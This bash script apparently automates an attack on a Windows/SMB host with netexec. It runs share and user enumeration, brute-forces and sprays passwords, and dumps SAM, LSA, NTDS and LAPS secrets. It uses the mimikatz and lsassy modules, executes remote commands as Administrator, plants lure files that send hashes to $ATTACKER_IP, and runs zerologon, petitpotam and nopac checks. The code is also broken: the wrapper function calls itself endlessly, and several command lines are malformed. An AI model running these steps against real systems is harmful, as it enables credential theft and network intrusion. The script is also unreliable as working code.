#!/bin/bash

# Function to display usage
usage() {
    echo "Usage: $0 -i <IP_ADDRESS>"
    exit 1
}

# Parse command line arguments
while getopts "i:" opt; do
    case $opt in
        i)
            TARGETS="$OPTARG"  # Store the IP address in TARGETS
            ;;
        *)
            usage
            ;;
    esac
done

# Ensure an IP address is provided
if [ -z "$TARGETS" ]; then
    usage
fi

# Function for executing netexec commands
netexec() {
    local ip=$1
    local user=$2
    local pass=$3
    # Call netexec with the given parameters
    netexec smb $ip -u $user -p $pass "$4"
}

# Basic enumeration for empty/guest user or no credentials
echo "[*] Enumerating shares and other details for $TARGETS with empty/guest user"
netexec $TARGETS "" "" "--shares"
netexec $TARGETS "" "" "-M spider_plus"
netexec $TARGETS "" "" "--sessions"
netexec $TARGETS "" "" "--disks"
netexec $TARGETS "" "" "--loggedon-users"
netexec $TARGETS "" "" "--users"
netexec $TARGETS "" "" "--groups"
netexec $TARGETS "" "" "--local-groups"
netexec $TARGETS "" "" "--pass-pol"

# Check specific user credentials or hash
echo "[*] Checking with specific credentials"
USERNAMES=("user1" "user2" "admin")  # Add more usernames as needed
PASSWORDS=("password1" "password2" "Summer18")  # Add more passwords or use a file

for USERNAME in "${USERNAMES[@]}"; do
    for PASS in "${PASSWORDS[@]}"; do
        netexec $TARGETS $USERNAME $PASS ""
        netexec $TARGETS $USERNAME $PASS "-H 'LM:NT'"
        netexec $TARGETS $USERNAME $PASS "-H 'NTHASH'"
    done
done

# Null session
echo "[*] Attempting null session"
netexec $TARGETS "" "" ""

# Password spraying
echo "[*] Running password spraying"
netexec $TARGETS $USERNAME user2 user3 -p Summer18
netexec $TARGETS $USERNAME -p /path/to/$PASSs.txt
netexec $TARGETS $USERNAME -p /path/to/users.txt -p Summer18 --continue-on-success

# Local authentication and credential dump
echo "[*] Local authentication and dumping credentials"
netexec $TARGETS $USERNAME $PASS "--local-auth"
netexec $TARGETS $USERNAME $PASS "--sam"
netexec $TARGETS $USERNAME $PASS "--lsa"
netexec $TARGETS $TARGETS $USERNAME $PASS "--ntds"
netexec $TARGETS $TARGETS $USERNAME $PASS "--ntds vss"

# Exploitation modules
echo "[*] Running exploitation modules"
netexec $TARGETS $USERNAME $PASS "-M lsassy"
netexec $TARGETS $USERNAME $PASS "-M nanodump"
netexec $TARGETS $USERNAME $PASS "-M mimikatz"
netexec $TARGETS $USERNAME $PASS "-M procdump"

# LAPS password
echo "[*] Dumping LAPS password"
netexec ldap $TARGETS $USERNAME $PASS "-M laps -o computer=$TARGETS"

# Command execution via CMD and PowerShell
echo "[*] Running command execution via CMD and PowerShell"
netexec $TARGETS "Administrator" $PASS "-x whoami"
netexec $TARGETS "Administrator" $PASS "-X '$PSVersionTable'"

# Writing leak file
echo "[*] Writing leak file"
netexec $TARGETS $USERNAME $PASS "-M slinky -o SERVER=$ATTACKER_IP -o NAME=leak_file.lnk"
netexec $TARGETS $USERNAME $PASS "-M scuffy -o SERVER=$ATTACKER_IP -o NAME=leak_file.scf"

# Search for CVEs
echo "[*] Searching for CVEs"
netexec $TARGETS $USERNAME $PASS "-M zerologon"
netexec $TARGETS $USERNAME $PASS "-M petitpotam"
netexec $TARGETS $USERNAME $PASS "-M nopac"

echo "[*] Enumeration complete"
